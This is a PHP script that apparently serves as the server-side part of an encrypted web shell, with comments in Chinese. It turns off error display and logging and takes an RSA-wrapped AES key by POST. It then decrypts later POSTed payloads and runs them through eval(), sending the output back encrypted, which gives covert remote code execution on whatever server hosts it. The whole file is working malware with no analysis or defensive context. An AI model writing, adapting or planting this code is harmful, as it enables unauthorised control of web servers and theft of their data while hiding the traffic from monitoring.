<?php
//global: $ID, $pri_key
ini_set("session.use_trans_sid" ,0);
ini_set("session.use_only_cookies" ,0);
ini_set("session.use_cookies" ,0);
ini_set('display_errors', 'off');
ini_set('log_errors', 'off');
error_reporting(-1);
@session_id($ID);
if($_SERVER['REQUEST_METHOD'] === 'POST'){
    if(empty($_POST)){
        die(strval($ID));
    }
    if(isset($_POST['iv'])){
        $iv = base64_decode($_POST['iv']);
        unset($_POST['iv']);
        $data = base64_decode(end($_POST));
        if(($pri = openssl_pkey_get_private($pri_key)) === false) exit(0);
        if(openssl_private_decrypt($data, $result, $pri)===false) exit(0);
        @session_start();
        $_SESSION['aes_key'] = $result;
        $_SESSION['aes_iv'] = $iv;
        @session_write_close();
        die(base64_encode($iv));
    }

    $result = array('code'=>1, 'msg'=>array(), 'data'=>'');
    $raw_level = -1;
    function add_error_info($error_no, $error_msg, $iswarning){
        global $result;
        $tmp = array();
        $tmp['errcode'] = $error_no;
        $tmp['errmsg'] = base64_encode($error_msg);
        $tmp['iswarning'] = $iswarning;
        $result['msg'][] = $tmp;
    }
    set_error_handler(function ($error_no, $error_msg, $error_file, $error_line) {
        global $result;
        $msg = $error_msg." on ".$error_file;
        add_error_info($error_no, $msg, $error_no != E_USER_ERROR);
        if($error_no == E_USER_ERROR){
            $result['code'] = -1;//表示致命错误，脚本需要中断返回
            exit(0);
        }else{
            $result['code'] = 0;//普通错误，只提示不中断
        }
    });
    set_exception_handler(null);
    register_shutdown_function(function (){
        //无论是否发生错误都会返回
        global $result, $raw_level;
        if(!defined('AES_KEY') || !defined('AES_IV')) exit(0);
        if(ob_get_level() == $raw_level){//当payload执行终止时获取终止前的输出内容（如调用了die函数）
            $content = ob_get_contents();
            ob_end_clean();
            $content = base64_encode($content);
            $result['data'] = $content;
        }
        
        $ret = json_encode($result);
        $ret = openssl_encrypt($ret, 'aes-256-cbc', AES_KEY, OPENSSL_RAW_DATA, AES_IV);
        header("HTTP/1.0 200 OK");
        echo $ret;
    });
    function E($payload){@eval($payload);} // 隔离变量作用域

    if(($data = end($_POST)) === false) exit(0);
    $data = base64_decode($data);
    @session_start();
    define("AES_KEY", $_SESSION['aes_key']);
    define("AES_IV", $_SESSION['aes_iv']);
    @session_write_close();
    if(($payload = openssl_decrypt($data, 'aes-256-cbc', AES_KEY, OPENSSL_RAW_DATA, AES_IV))===false) trigger_error("RSA decryption failed.", E_USER_ERROR);
    try{
        ob_start();
        $raw_level = ob_get_level();
        E($payload);
        $content = ob_get_contents();
        ob_end_clean();
        if($content === false){
            throw new Exception("Eval code got content failed!");
        }
        $content = base64_encode($content);
        $result['data'] = $content;
    }catch(Exception $e){
        $result['code'] = -1;
        $code = is_integer($e->getCode())?$e->getCode():1;
        add_error_info($code+65535, $e->getMessage().$e->getTraceAsString(), false);
    }catch(Error $err){
        $result['code'] = -1;
        $code = is_integer($err->getCode())?$err->getCode():1;
        add_error_info($code+65535, $err->getMessage().$err->getTraceAsString(), false);
    }
}
